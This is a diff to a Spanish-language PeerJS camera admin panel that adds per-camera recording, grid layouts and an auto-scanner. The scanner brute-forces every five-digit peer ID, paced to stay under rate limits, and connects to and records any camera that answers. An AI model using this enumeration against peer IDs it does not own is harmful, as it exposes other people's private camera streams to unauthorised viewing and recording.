-// ─── RECORDING ───
-function startRecording() {
-  if (!remoteVideo.srcObject || isRecording) return;
-  recordedChunks = [];
+function focusCell(camId, event) {
+  if (event) event.stopPropagation();
+  selectCamera(camId);
+  setLayout(1);
+}
+
+// ── RECORDING ──────────────────────────────
+function startCamRec(camId) {
+  const cam = cameras[camId];
+  if (!cam || cam.isRecording || !cam.stream) return;
+  cam.recordedChunks = [];
   const opts = MediaRecorder.isTypeSupported('video/webm;codecs=vp9')
-    ? {mimeType:'video/webm;codecs=vp9', videoBitsPerSecond:4000000}
-    : {mimeType:'video/webm', videoBitsPerSecond:4000000};
-  try { mediaRecorder = new MediaRecorder(remoteVideo.srcObject, opts); }
-  catch { mediaRecorder = new MediaRecorder(remoteVideo.srcObject); }
-  mediaRecorder.ondataavailable = e => { if(e.data.size>0) recordedChunks.push(e.data); };
-  mediaRecorder.onstop = () => {
-    const blob = new Blob(recordedChunks, {type:'video/webm'});
+    ? {mimeType:'video/webm;codecs=vp9',videoBitsPerSecond:4000000}
+    : {mimeType:'video/webm',videoBitsPerSecond:4000000};
+  try { cam.mediaRecorder = new MediaRecorder(cam.stream, opts); }
+  catch { cam.mediaRecorder = new MediaRecorder(cam.stream); }
+  cam.mediaRecorder.ondataavailable = e => { if(e.data.size>0) cam.recordedChunks.push(e.data); };
+  cam.mediaRecorder.onstop = () => {
+    const blob = new Blob(cam.recordedChunks, {type:'video/webm'});
     const ts = new Date().toISOString().replace(/[:.]/g,'-').slice(0,-5);
     const a = document.createElement('a');
     a.href = URL.createObjectURL(blob);
-    a.download = `streamlink-visor-rec-${ts}.webm`;
+    a.download = `streamlink-admin-rec-${camId}-${ts}.webm`;
     a.click();
     URL.revokeObjectURL(a.href);
-    recordedChunks = [];
+    cam.recordedChunks = [];
   };
-  mediaRecorder.start(1000);
-  isRecording = true;
-  recStartTime = Date.now();
-  recTimer.style.display='flex';
-  recordBtn.classList.add('rec-active');
-  recordBtn.innerHTML=`<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="3" width="18" height="18" rx="2" fill="currentColor"/></svg> Detener Grabación`;
-  recordBtnBot.classList.add('danger');
-  recLabelBot.textContent='Detener';
-  recInterval=setInterval(()=>{
-    recTimerVal.textContent=fmtTime(Math.floor((Date.now()-recStartTime)/1000));
-  },1000);
+  cam.mediaRecorder.start(1000);
+  cam.isRecording = true;
+  if (selectedId === camId) bindControls(camId);
+  toast(`Grabación iniciada (Cam ${camId})`, 'info');
 }
-function stopRecording() {
-  if (!isRecording || !mediaRecorder) return;
-  mediaRecorder.stop();
-  isRecording=false;
-  clearInterval(recInterval);
-  recTimer.style.display='none';
-  recordBtn.classList.remove('rec-active');
-  recordBtn.innerHTML=`<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="8"/><circle cx="12" cy="12" r="3" fill="currentColor"/></svg> Grabar Stream`;
-  recordBtnBot.classList.remove('danger');
-  recLabelBot.textContent='Grabar';
+
+function stopCamRec(camId) {
+  const cam = cameras[camId];
+  if (!cam || !cam.isRecording || !cam.mediaRecorder) return;
+  cam.mediaRecorder.stop();
+  cam.isRecording = false;
+  if (selectedId === camId) bindControls(camId);
+  toast(`Grabación guardada (Cam ${camId})`, 'success');
 }
-recordBtn.addEventListener('click', () => { isRecording ? stopRecording() : startRecording(); });
-recordBtnBot.addEventListener('click', () => { isRecording ? stopRecording() : startRecording(); });
+
+// ── LAYOUT ─────────────────────────────────
+function setLayout(n) {
+  currentLayout = n;
+  const grid = document.getElementById('camGrid');
+  grid.className = 'cam-grid layout-' + n;
+  document.querySelectorAll('.view-btn').forEach(b => b.classList.remove('active'));
+  const lbtn = document.getElementById('vb-' + n);
+  if (lbtn) lbtn.classList.add('active');
+  const labels = {1:'1×1',2:'1×2',4:'2×2',9:'3×3',auto:'Auto'};
+  document.getElementById('layoutLabel').textContent = labels[n] || n;
+  renderGrid();
+}
+
+function toggleAllFullscreen() {
+  const area = document.getElementById('gridArea');
+  if (!document.fullscreenElement) area.requestFullscreen().catch(()=>{});
+  else document.exitFullscreen();
+}
+
+// ── AUTO SCANNER ───────────────────────────
+async function autoScan() {
+  if (isScanning) { stopScan(); return; }
+  isScanning = true;
+  scanAbort  = false;
+  document.getElementById('scanBtn').classList.add('scanning');
+  document.getElementById('scanBtnLabel').textContent = 'Detener escaneo';
+  setStatus('ESCANEANDO...', 'badge-scan');
+  toast('Escaneando rango 00000–99999…', 'info', 5000);
+
+  // We probe IDs in parallel batches to avoid PeerJS rate-limiting
+  const BATCH = 10;
+  const TOTAL  = 100000;
+  let found = 0;
+
+  initAdminPeer(async () => {
+    for (let start = 0; start < TOTAL; start += BATCH) {
+      if (scanAbort) break;
+      const pct = Math.min(100, Math.round(start / TOTAL * 100));
+      document.getElementById('scanProgressBar').style.width = pct + '%';
+      document.getElementById('scanBtnLabel').textContent = `Escaneando… ${start.toString().padStart(5,'0')} (${pct}%)`;
+
+      const batch = [];
+      for (let i = start; i < Math.min(start + BATCH, TOTAL); i++) {
+        batch.push(i.toString().padStart(5,'0'));
+      }
+
+      await Promise.all(batch.map(id => probePeer(id)));
+      // small yield
+      await new Promise(r => setTimeout(r, 50));
+    }
+
+    if (!scanAbort) {
+      document.getElementById('scanProgressBar').style.width = '100%';
+      toast(found > 0 ? `Escaneo completo. ${found} cámara(s) encontrada(s).` : 'Escaneo completo. Sin cámaras detectadas.', found > 0 ? 'success' : 'info');
+    }
+    stopScan();
+  });
+
+  function probePeer(id) {
+    if (cameras[id]) return Promise.resolve();
+    return new Promise(resolve => {
+      const conn = adminPeer.connect(id, { reliable: false, label: 'probe' });
+      const t = setTimeout(() => { try { conn.close(); } catch(e){} resolve(); }, 2500);
+      conn.on('open', () => {
+        clearTimeout(t);
+        try { conn.close(); } catch(e) {}
+        if (!cameras[id] && !scanAbort) {
+          found++;
+          connectCamera(id);
+        }
+        resolve();
+      });
+      conn.on('error', () => { clearTimeout(t); resolve(); });
+    });
+  }
+}
+
+function stopScan() {
+  isScanning = false;
+  scanAbort  = true;
+  document.getElementById('scanBtn').classList.remove('scanning');
+  document.getElementById('scanBtnLabel').textContent = 'Escanear rango (00000–99999)';
+  document.getElementById('scanProgressBar').style.width = '0%';
+  updateTopStats();
+}
+
+// ── EVENTS ─────────────────────────────────
+document.getElementById('addCamBtn').addEventListener('click', () => {
+  const code = document.getElementById('manualCode').value.trim();
+  connectCamera(code);
+  document.getElementById('manualCode').value = '';
+});
+document.getElementById('manualCode').addEventListener('keydown', e => {
+  e.target.value = e.target.value.replace(/\D/g,'').slice(0,5);
+  if (e.key === 'Enter') document.getElementById('addCamBtn').click();
+});
+document.getElementById('manualCode').addEventListener('input', e => {
+  e.target.value = e.target.value.replace(/\D/g,'').slice(0,5);
+});
+document.getElementById('scanBtn').addEventListener('click', autoScan);
+
+// ── INIT ───────────────────────────────────
+initAdminPeer(() => {
+  setStatus('LISTO', 'badge-live');
+  toast('Admin panel listo', 'success');
+});
+updateTopStats();
+renderDetailPanel();
 </script>
 </body>
 </html>
